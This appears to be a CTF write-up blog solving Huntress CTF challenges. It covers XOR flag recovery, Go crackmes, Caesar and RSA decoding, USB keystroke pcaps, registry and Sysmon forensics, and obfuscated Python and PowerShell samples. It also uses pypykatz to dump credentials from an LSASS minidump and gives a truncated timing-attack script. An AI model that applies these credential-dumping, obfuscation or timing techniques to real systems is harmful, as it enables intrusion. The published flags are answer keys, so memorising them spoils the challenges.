I started with the normal tricks like `strings`, `ltrace`, and `strace`. Running `strings` did show something interesting but not enough to find a lead. Executing the binary only displays **Hello, World!** Nothing more.

So I decompiled the binary in Ghidra and went to the entry point. Upon inspecting, it seems that the function is constructing a flag and encrypting it using an XOR operation between the data in `0804a00e` and `0804a02e` memory addresses. We can de-XOR the data in those memory addresses to get the flag back. This Python script did the trick:

```
from pwn import *

# Open the binary in pwntools to read bytes
bin_file = ELF('stack_it.bin')

# Addresses for the XOR data arrays
data1_addr = 0x0804a00e # Address of &DAT_0804a00e
data2_addr = 0x0804a02e # Address of &DAT_0804a02e
flag_start = "flag{"
flag_end = "}"

# Read the 32 bytes from each data address
data1 = bin_file.read(data1_addr, 32)
data2 = bin_file.read(data2_addr, 32)

# XOR corresponding bytes from data1 and data2
flag_middle = ''.join(chr(b1 ^ b2) for b1, b2 in zip(data1, data2))

# Construct the full flag
flag = flag_start + flag_middle + flag_end
print("Flag:", flag)
```

Flag: flag{b4234f4bba4685dc84d6ee9a48e9c106}

## Knight’s Quest
> 
An adventurer is YOU! Play Knight’s Quest, beat the three monsters, and claim the flag! Very straightforward with no surprises, no sir-ee, no surprises here lmao

Author: @HuskyHacks

You’re given a `knights_quest` binary file. You can get one for each OS. I got the Linux one. Upon some inspecting, it turned out to be a Go binary. After doing some of the initial checking, I ran the binary. Woo! It’s a game. Let’s play it.

We get our first monster. It’s a spider.

Huh! Way too easy. Next comes the Ogre.

Meh! That was a breeze. Alright, who’s next?

Haha. Piece of cak — Uwaahh. What is THAT??? I got decimated. Okay, calm down. We can do this. Let’s jump into Ghidra.

I started playing around but it was extremely difficult to understand what was going on and where to look for the right functions since the binary was stripped. Then I got a plan.

I searched the codebase for the hexadecimal representation of 999999999, the final boss’s attack and HP. That quickly filtered the function I needed to look for.

From here on, it was some simple modding. I patched both instructions to be 0x00000001 (1 damage and 1 HP), and saved the patched version. This time, the final boss was no match for me.

Defeating Gorthmog gave me the password: `hmafgAhAalqmQABBOAZtP3OWFegsQDAB`

Then according to the game instructions, I sent this password using the specified command to get the flag.

```
curl -X POST -H "Content-Type: application/json" -d '{"password":"YOUR_PASSWORD"}' http://[CHALLENGE_URL:PORT]/submit
```

Flag: flag{40b5b7e5395ee921cbbc804d4350b9c1}

## GoCrackMe1
> 
TENNNNNN-HUT!

Welcome to the Go Dojo, gophers in training!

Go malware is on the rise. So we need you to sharpen up those Go reverse engineering skills. We’ve written three simple CrackMe programs in Go to turn you into Go-binary reverse engineering ninjas!

First up is the easiest of the three. Go get em!

**Archive password: **`**infected**`

Author: @HuskyHacks

You’re given a ZIP file which, when you unzip, gives a Go binary file. This was my first time dealing with a Go binary. And in case you don’t know, Go binaries are a lot harder to crack than C binaries.

Anyway, I started with all the low-hanging fruits like `strings`, `ltrace`, and `strace`, but nothing of that interest. Finally, tried to become brave and opened it in Ghidra. After a bit of searching, I found the `main.main` function.

The first thing that got my attention was that loop that’s performing XOR. I’ve seen many writeups before that involved decoding the XOR to find the flag. So I started there.

I made of list of the hex values of the variables and decoded them in Python.

```
encoded_bytes = [
 0x34, 0x2d, 0x31, 0x37, 0x3a, 0x30, 0x63, 0x34, 
 0x30, 0x67, 0x64, 0x33, 0x60, 0x60, 0x63, 0x6f, 
 0x6e, 0x60, 0x63, 0x33, 0x63, 0x63, 0x32, 0x66, 
 0x34, 0x34, 0x32, 0x65, 0x30, 0x6f, 0x6e, 0x63, 
 0x30, 0x66, 0x35, 0x33, 0x2b, 0x6e
]

decoded_string = ''.join(chr(b ^ 0x56) for b in encoded_bytes)
print(decoded_string)
```

This is what returned.

```
b{galf5bf12e6659865e55d0bbd3f985f0ce}8
```

You can see that **galf** (reverse of flag) in the beginning which means I was on the right track. I first tried to randomly re-arrange the letters to try to make the flag but failed.

After thinking a bit, I noticed a pattern. In the Ghidra decompilation, the variables were structured like this:

```
local_56 = 0x342d31373a30;
uStack_50 = 0x6334;
uStack_4e = 0x306764336060636f;
local_46 = 0x6e6063336363;
uStack_40 = 0x3266;
uStack_3e = 0x34343265306f6e63;
uStack_36 = 0x30663533;
uStack_32 = 0x2b6e;
```

Looking a bit closely, you can see that:

- `0x342d31373a30` (6 bytes) breaks down to: `0x34, 0x2d, 0x31, 0x37, 0x3a, 0x30`

- `0x6334` (2 bytes) breaks down to: `0x63, 0x34`

- `0x306764336060636f` (8 bytes) breaks down to: `0x30, 0x67, 0x64, 0x33, 0x60, 0x60, 0x63, 0x6f`

- `0x6e6063336363` (6 bytes) breaks down to: `0x6e, 0x60, 0x63, 0x33, 0x63, 0x63`

- `0x3266` (2 bytes) breaks down to: `0x32, 0x66`

- `0x34343265306f6e63` (8 bytes) breaks down to: `0x34, 0x34, 0x32, 0x65, 0x30, 0x6f, 0x6e, 0x63`

- `0x30663533` (4 bytes) breaks down to: `0x30, 0x66, 0x35, 0x33`

- `0x2b6e` (2 bytes) breaks down to: `0x2b, 0x6e`

Coming back to the flag, if I reverse the first 6 characters, I get **flag{b**, which looks more like the flag structure. Similarly, if I reverse the last 2 characters, I get **8}**, again matching the ending of the flag structure.

And that was the secret behind the way I needed to re-arrange the flag parts. I had to take a chunk of the string according to the byte size of the variables, reverse them, and then join them to get the flag. Here’s an updated Python script to do that.

```
# List of byte chunks
byte_chunks = [
 [0x34, 0x2d, 0x31, 0x37, 0x3a, 0x30],
 [0x63, 0x34],
 [0x30, 0x67, 0x64, 0x33, 0x60, 0x60, 0x63, 0x6f],
 [0x6e, 0x60, 0x63, 0x33, 0x63, 0x63],
 [0x32, 0x66],
 [0x34, 0x34, 0x32, 0x65, 0x30, 0x6f, 0x6e, 0x63],
 [0x30, 0x66, 0x35, 0x33],
 [0x2b, 0x6e]
]

# XOR, reverse, and join each chunk in one line
flag = ''.join(
 ''.join(chr(b ^ 0x56) for b in chunk)[::-1] # XOR and reverse
 for chunk in byte_chunks
)

print(flag)
```

Flag: flag{bb59566e21f55e5680d589f3dbbec0f8}
Cryptography
## Strive Marish Leadman TypeCDR
> 
Looks like [primo hex garbage.](https://web.archive.org/web/20250825065534/https://www.ntietz.com/blog/rsa-deceptively-simple/)
Maybe something went wrong?
Can you make sense of it?

Author: @aenygma

You’re given a remote server to connect to. Upon connecting, you see some large hexadecimal numbers denoted as p, q, n, e, d, and another one without any notation. Seems like I already know what to do However, the given link in the description added further to my assumption.

It’s an RSA problem. You’re given all the values you need but in hexa. So, first, convert all the numbers to decimal and then decrypt the cipher (the last number without any notation).

Flag: flag{cf614b15ac1dd461a2e48afdfe21b8e8}

## No need for Brutus
> 
A simple message for you to decipher:

`squiqhyiiycfbudeduutvehrhkjki`

Submit the original plaintext hashed with MD5, wrapped between the usual flag format: `flag{}`

*Ex: If the deciphered text is "hello world", the MD5 hash would be *`*5eb63bbbe01eeed093cb22bb8f5acdc3*`*, and the flag would be *`*flag{5eb63bbbe01eeed093cb22bb8f5acdc3}*`*.*

Author: @aenygma

Looks like a Caesar cipher (*cough* *cough* Brutus *cough* *cough*). So I went to [Cryptii](https://web.archive.org/web/20250825065534/https://cryptii.com/). Chose Caesar cipher from the options and kept changing the shift. Shift 16 gave this output:

```
caesarissimplenoneedforbrutus
```

Now generate the MD5 hash from this text and that’s the flag.

Flag: flag{c945bb2173e7da5a292527bbbc825d3f}
Forensics
## Ancient Fossil
> 
All things are lost to time…

Author: @JohnHammond

You’re given an ancient.fossil file. I first though it would just be some kind of regular file with a different extension. But nope, the extension was for real. Running `file` on it returned:

```
ancient.fossil: SQLite 3.x database (Fossil repository), last written using SQLite version 3046000, file counter 417, database pages 154, cookie 0x28, schema 4, UTF-8, version-valid-for 417
```

Hmm. So, it’s an SQLite database file but that “Fossil repository” part seems more interesting. After a bit of searching, I came to know about [Fossil SCM](https://web.archive.org/web/20250825065534/https://fossil-scm.org/home/doc/trunk/www/index.wiki), a version-controlling system. I then installed the [fossil tool](https://web.archive.org/web/20250825065534/https://fossil-scm.org/home/doc/2010-01-01/www/reference.wiki) to interact with the file.

However, that didn’t lead to anywhere. Everything I saw was in Base64. I tried to decode a few but didn’t lead to the flag. I also tried to upload and view the file in an SQLite viewer. But I couldn’t find anything interesting.

Then I decided to actually convert the fossil file to something I’m more familiar with.

Git.

Using the `export` command, I converted it to a `.git` file.

```
fossil export --git > output.git
```

Then I opened the `.git` file in sublime and there you go. The flag was there.

Flag: flag{2ed33f365669ea9f10b1a4ea4566fe8c}

## Keyboard Junkie
> 
My friend wouldn’t shut up about his new keyboard, so…

Author: @JohnHammond

I can feel your friend. Even I wouldn’t stop talking about my new key —

Anyway, we’re given a `keyboard_junkie` file which turns out to be a `pcap` file. Inspecting it on Wireshark revealed that it was a USB packet file. I’ve never done a USB packet analysis before so doing some quick research brought some good resources.

I started with this [CTF writeup](https://web.archive.org/web/20250825065534/https://steemit.com/reverseengineering/@nileshevrywhr/auth0-ctf-reverse-engineering-usb-keystrokes-from-pcaps) which gave me a good idea of what to do. The first thing I did was filter the packets based on keyboard strokes. I used this filter:

```
usb.transfer_type == 0x01 && frame.len == 72 && !(usb.capdata == 00:00:00:00:00:00:00:00)
```

**Note:** This is where the confusion started. That’s why script kiddies like my struggle so much. I initially just copy-pasted the filter and it wasn’t working. Turns out, I had to filter by length in this challenge rather than by destination.

This filtered out the keyboard stroke packets. I exported those as a CSV file and cleaned them so that only the leftover data is left:

```
cat filtered_keyboard.csv | cut -d ',' -f 8 > leftover_data.txt
```

The last thing I need to do is convert these keyboard stroke hex values into actual keyboard keys. For that, you can refer to [this guide](https://web.archive.org/web/20250825065534/https://usb.org/sites/default/files/hut1_21.pdf). I first used the Python script (I modified it a little) provided in that writeup and got this as an output:

```
m m m m m m m m m m m m m s o space space space space t h e space space space space a n s w w w w e r space i i i i s space space space space space space space f l a a a a g del [ del del del del f f f f 7 7 7 7 7 3 3 3 3 3 e e e e e e e 0 0 9 9 9 9 9 9 9 3 b b b b b b b 7 d d d d d d d d d d 2 8 8 8 8 1 1 1 1 1 1 1 d d d d d 0 0 0 0 a a a a 3 3 3 3 0 f f f f c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c c f f f f 3 3 3 3 4 a a a a 9 9 9 9 6 3 4 4 4 4 4 4 4 del ] del del del del del del del space space space space h a h a h a a a a h space l o l l l l
```

As you can see, the flag is there. I tried to remove the redundant characters and got this:

```
flag{f73e093b7d281d0a30fcf34a9634}
```

However, it was incorrect. The reason is that the hash-like part of the flag needs to be 32 characters long but this was only 28. I was missing 4 characters. Either that, or some of the redundant characters aren’t actually redundant.

This was an easy challenge, but this is where I got totally stuck and couldn’t find any solution. Just when I was on the verge of giving up, I thought I should check for alternate solutions.

Digging through YouTube, I found [John Hammond’s video](https://web.archive.org/web/20250825065534/https://www.youtube.com/watch?v=0HXL4RGmExo) on a similar challenge. Noice! I used his Python script instead:

```
from scapy.all import *

keyboard = { 
0: "", 1: "", 2: "PostFail", 4: "a", 5: "b", 6: "c", 7: "d", 8: "e", 9: "f", 10: "g", 11: "h", 12: "i", 13: "j", 14: "k", 15: "l", 16: "m", 17: "n", 18: "o", 19: "p", 20: "q", 21: "r", 22: "s", 23: "t", 24: "u", 25: "v", 26: "w", 27: "x", 28: "y", 29: "z", 30: "1", 31: "2", 32: "3", 33: "4", 34: "5", 35: "6", 36: "7", 37: "8", 38: "9", 39: "0", 40: "Enter", 41: "esc", 42: "del", 43: "tab", 44: "space", 45: "-", 47: "[", 48: "]", 49: "\\", 51: "DownArrow", 54: "1", 55: "*", 56: "/", 57: "CapsLock", 79: "RightArrow", 80: "LeftArrow"
}

packets = rdpcap('keyboard_junkie.pcap')

potential_flag = []

for packet in packets:
 special_byte = packet[0].load[-6]
 potential_flag.append((keyboard[special_byte]))

print("".join(potential_flag))
```

That finally got me the flag.

Flag: flag{f7733e0093b7d281dd0a30fcf34a9634}

As I assumed, some characters were indeed not redundant but rather repetitive sequentially. But there was no way to know which ones.

## Zimmer Down
> 
A user interacted with a suspicious file on one of our hosts.
The only thing we managed to grab was the user’s registry hive.
Are they hiding any secrets?

Author: @sudo_Rem

You’re given an `NTUSER.DAT` file, which contains Windows user profile settings. The problem name immediately reminded me of Eric Zimmerman, the person behind the [Registry Explorer](https://web.archive.org/web/20250825065534/https://www.sans.org/tools/registry-explorer/) software. So I turned it on and loaded the hive file.

Since we needed to deal with a suspicious file, I figured I should check out the files with which the user interacted. So I went down this path:

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
```

A lot of folders for different types of files. However, the `.b62` folder grabbed my attention (looks sus). Upon opening the folder, I found an encoded string under “Target Name” in the right side window. How to decode this? Well, **b62** does sound like **Base62**. So I used an online decoder tool to decode the string and found the flag.

Flag: flag{4b676ccc1070be66b1a15dB601c8d500}

## Obfuscation Station
> 
You’ve reached the Obfuscation Station!
Can you decode this PowerShell to find the flag?
**Archive password: **`**infected-station**`

Author: @resume

You’re given a ZIP file. Upon unzipping, you find a PowerShell file with the following content:

```
(nEW-objECt SYstem.iO.COMPreSsIon.deFlaTEStREAm( [IO.mEmORYstreAM][coNVERt]::FROMBAse64sTRING( 'UzF19/UJV7BVUErLSUyvNk5NMTM3TU0zMDYxNjSxNDcyNjexTDY2SUu0NDRITDWpVQIA') ,[io.COmPREssioN.coMpreSSioNmODE]::DeCoMpReSS)| %{ nEW-objECt sYStEm.Io.StREAMrEADeR($_,[TeXT.encodiNG]::AsCii)} |%{ $_.READTOENd()})| & ( $eNV:cOmSPEc[4,15,25]-JOin'')
```

At first, it feels very obfuscated (duh!). But if you look closely, you can actually get an idea of what’s happening. First, I decoded the Base64 string. Then I decompressed it using ZLIB, transformed it to ASCII, and that gave the flag. Here’s the script I used:

```
import base64
import zlib

data = base64.b64decode('UzF19/UJV7BVUErLSUyvNk5NMTM3TU0zMDYxNjSxNDcyNjexTDY2SUu0NDRITDWpVQIA')
decompressed_data = zlib.decompress(data, -zlib.MAX_WBITS)
print(decompressed_data.decode('ascii'))
```

Funny because I didn’t have to touch the other parts. But if I’m guessing correctly, there has to be an intended way to solve this (such as fixing the casing and then running it).

Flag: flag{3ed675ef0343149723749c34fa910ae4}

## Hidden Streams
> 
Beneath the surface, secrets glide,
A gentle flow where whispers hide.
Unseen currents, silent dreams,
Carrying tales in hidden streams.

Can you find the secrets in these Sysmon logs?

Author: Adam Rice (@adam.huntress)

We’re given a Windows events log file. I opened it on my Windows machine and started skimming through the logs. The first thing to notice in such logs is event IDs. If you know which event ID is for which event, it becomes much easier to find what you’re looking for.

Anyways, the problem description talks about streams. Out of all event IDs, ID 15 is about [FileCreateStreamHash](https://web.archive.org/web/20250825065534/https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90015). Hmm. Upon scrolling, I saw that there was only 1 event with that ID. Going through the details revealed a hash in the Contents section.

Decoding the hash from Base64 gave the flag.

Flag: flag{bfefb891183032f44fa93d0c7bd40da9}

## Little Shop of Hashes
> 
*In the packet, secrets lie,
Whispers of data pass by,
Encrypted shadows creep,
While the watchful eyes peep.*

Are you able to unravel the attack chain?

***NOTE: Flags for Part #1 to Part #5 will all be human-readable answers and in a non-standard flag format. You will use the same downloadable attachment and log files to answer all the questions.***

Author: Austin Worline, Jose Oregon, and Adrian Garcia

A Windows event log analysis challenge. You’re given a ZIP file which contains several log files.

> 
Q1. **What is the name of the service that the attacker ran and stopped, which dumped hashes on the first compromised host?**

Sol. Remote Registry

Go to Host B `System.evtx` file and search for Events with ID 7036. Inspect each event.

> 
Q2. **What lateral movement technique did the threat actor use to move to the other machine?**

Sol. Pass the Hash

From question 1, we can assume that the attacker is trying to steal the password hashes of the users, which leads to a [Pass the Hash](https://web.archive.org/web/20250825065534/https://en.wikipedia.org/wiki/Pass_the_hash) attack.

> 
Q3. **What is the full path of the binary that the threat actor used to access the privileges of a different user with explicit credentials?**

Sol. C:\Users\DeeDee\Documents\runasc.exe

There is an Event ID 4648 in the Host A Security log. You can find the process name with the full path.

> 
Q4. **How many accounts were compromised by the threat actor?**

Sol. 3

This was a bit guessy on my part. I believe it’s DeeDee, Niko, and Craig.

> 
Q5. **What is the full path of the binary that was used to attempt a callback to the threat actor’s machine?**

Sol. C:\Users\DeeDee\Documents\nc.exe

This took me a while because I was mostly searching in the Security logs. The answer was in the Application log of Host A.
Malware
## Discount Programming Devices
> 
I used a tool on the internet to obfuscate my script!
But I lost it, and I don’t know how to get it back.
Maybe you can help?

Author: @sudo_Rem

You’re given a Python file named `oops.py`. Here’s the content:

```
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
```

So seems like they used an online tool to obfuscate the code. Oh well, I’ll just find one to deobfuscate it. Searching online brought up [this Pyobfuscate website](https://web.archive.org/web/20250825065534/https://pyobfuscate.com/deobf). I pasted the code and it gave me the deobfuscated code back. Running that code revealed the flag.

Flag: flag{2543ff1e714bC2eb9ff78128232785ad}

## Mimi
> 
Uh oh! Mimi forgot her password for her Windows laptop!

Luckily, she dumped one of the crucial processes running on her computer (don’t ask me why, okay)… can you help her recover her password?

**NOTE: This file on its own is not malware per say, but it is likely to raise antivirus alerts. Would recommend examining this inside of a virtual environment.**

**NOTE: Archive password is **`**mimi**`

Author: @JohnHammond

You’re given a `mimi.7z` file. Upon inspecting the file, I learned that it was a Mini DuMP crash report file. The challenge description and name are enough to know that you need to use **mimikatz** to solve this.

So I downloaded **mimikatz** on my Windows 11 machine and tried to retrieve the password. However, there are some inherent problems with using **mimikatz** in Windows 11. I kept getting errors in every step.

So, I later settled for **pypykatz**, an OS-agnostic Python clone of **mimikatz **(heck yeah!) I renamed the file to `mimi.dmp`. Then I ran it through **pypykatz**.

```
pypykatz lsa minidump mimi.dmp
```

However, the output was too long so I had to `grep` the password, which was the flag.

```
pypykatz lsa minidump mimi.dmp | grep -i flag
```

Flag: flag{7a565a86761a2b89524bf7bb0d19bcea}
Miscellaneous
## Base-p-
> 
That looks like a weird encoding, I wonder what it’s based on.

Author: Izzy Spering

This challenge gave me a hard time. You’re given a `based.txt` file. Opening the file reveals a Chinese-looking text.

```
楈繳籁萰杁癣怯蘲詶歴蝕絪敪ꕘ橃鹲𠁢腂𔕃饋𓁯𒁊鹓湵蝱硦楬驪腉繓鵃舱𒅡繃絎罅陰罌繖𔕱蝔浃虄眵虂𒄰𓉋詘襰ꅥ破ꌴ顂𔑫硳蕈訶𒀹饡鵄腦蔷樸𠁺襐浸椱欱蹌ꍣ鱙癅腏葧𔕇鱋鱸𓁮聊聍ꄸꈴ陉𔕁框ꅔ𔕩𔕃驂虪祑𓅁聨朸聣摸眲葮𖠳鵺穭𒁭豍摮饱恕𓉮詔葉鰸葭楷洳面𔕃𔑒踳𔐸杅𐙥湳橹驳陪楴氹橬𓄱蝔晏稸ꄸ防癓ꉁ𖡩鵱聲ꍆ稸鬶魚𓉯艭𔕬輷茳筋𔑭湰𓄲怸艈恧襺陷项譶ꍑ衮汮蹆杗筌蹙怰晘缸睰脹蹃鹬ꕓ脶湏赑魶繡罢𒉁荶腳ꌳ蕔𔐶橊欹𖥇繋赡𐙂饎罒鵡𒉮腙ꍮ楑恤魌虢昹𒅶效楙衎𔕙ꉨ𓈸𔑭樯筶筚絮𓁗浈豱ꉕ魔魧蕕聘筣鹖樫ꍖ汸湖萰腪轪𓉱艱絍笹艨魚詇腁𒁮陴顮虂癁
```

I tried different types of BaseX conversions but to no avail. While researching, I found a problem from Huntress CTF 2023 named **BaseFFFF+1**. It was a Base65536 problem. Interestingly, the cipher given for that problem was also in Chinese.

Hope!

I quickly used an online decoder to decode the message and got this:

```
H4sIAG0OA2cA/+2QvUt6URjHj0XmC5ribzBLCwKdorJoSiu9qRfCl4jeILSICh1MapCINHEJpaLJVIqwTRC8DQ5BBQ0pKtXUpTej4C4lBckvsCHP6U9oadDhfL7P85zzPTx81416LYclYgEAOLgOGwKgxgnrJKMK8j4kIaAwF3TjiwCwBejQQDAshK82cKx/2BnO3xzhmEmoMWn/qdU+ntTUIO8gmOw438bbCwRv3Y8vE2ens9y5sejat497l51sTRO18E8j2aSAAkixqhrKFl8E6fZfotmMlw7Z3NKFmvp92s8+HMg+zTwaycvVQlnSn7FYW2LFYY0+X18JpB9LCYliSm6LO9QXvfaIbJAqvNsL3lTP6vJ596GyKIaXBnNdRJahnqYLnlQ4d+LfbQ91vpH0Y4NSYwhk8tmv/5vFZFnHWrH8qWUkTfgfUPXKcFVi+5Vlx7V90OjLjZqtqMMH9FhMZfGUALnotancBQAA
```

Okay, we can work with that. Looks like some kind of BaseX encoding. I went to Cyberchef and input it there. Luckily, there’s an auto-output button that saved my life.

Pressing that button added 3 conversions: From Base64, Gunzip, and Render Image. The output was a serial block of 13 colors.

First, I tried to find if there was some kind of color cipher. But didn’t find any that look similar to the given colors. Then I thought about hex codes. I went to a [color-picker tool](https://web.archive.org/web/20250825065534/https://imagecolorpicker.com/) and got the hex codes for all 13 colors.

```
#666c61
#677b35
#383663
#663863
#383439
#633937
#333065
#613762
#323131
#326666
#663339
#666636
#617d20
```

Converting the hex codes to ASCII revealed the flag.

Flag: flag{586cf8c849c9730ea7b2112fff39ff6a}

Honestly, I wouldn’t have been able to solve this one without Cyberchef’s auto-detection feature. So kudos to them.

## Time will tell
> 
A side channel timing attack.
Figure out the password in 90 seconds before connection terminates.
The password is dynamic and changes every connection session.

**NOTE, the password is eight characters long and will be hexadecimal.**

Author: @aenygma

As described, you need to do a [side-channel time-based attack](https://web.archive.org/web/20250825065534/https://medium.com/spidernitt/introduction-to-timing-attacks-4e1e8c84b32b). I’ve never done one before. So, I quickly ran a search to read the basics. Hmm, really cool concept.

I quickly crafted a Python script to automate it.

```
import socket
import time

# Connection details (update with actual server details)
HOST = 'challenge.ctf.games'
PORT = 32516

# Possible characters in a hex password
HEX_CHARS = '0123456789abcdef'
PASSWORD_LEN = 8

def send_guess(guess):
 """ Connects to the server and sends a guess, then measures response time. """
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 s.connect((HOST, PORT))
 s.recv(1024) # Read initial prompt

